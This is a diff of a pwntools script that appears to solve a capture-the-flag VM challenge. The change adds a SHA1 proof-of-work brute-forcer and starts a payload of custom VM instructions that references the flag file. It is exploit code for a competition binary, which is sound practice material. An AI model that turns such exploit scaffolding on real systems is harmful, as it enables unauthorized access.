@@ -1,4 +1,5 @@
 from pwn import *
+from hashlib import *
 
 r = process("./vm_name.py")
 
@@ -21,14 +22,24 @@ def inst(op, op_type, op1, op2):
 
 	return p
 
-while True:
-	rv = r.recv(1024)
-	print rv
-	if "syscall 3" in rv:
-		break
-	r.sendline("")
+print r.recvuntil("prefix : ")
+prefix = r.recvuntil("\n")[:-1]
 
-r.sendline("")
+print prefix
+
+i = 0
+while True:
+	h = prefix + str(i).zfill(8)
+	sha = new("SHA1")
+	sha.update(h)
+	if sha.hexdigest()[-6:] == "000000":
+		print "found: " + h
+		break
+	i += 1
+
+r.sendline(h)
+
+print r.recvuntil("name>")
 
 payload = "flag\x00"
 payload += inst(4, 1, 0, 0x1)
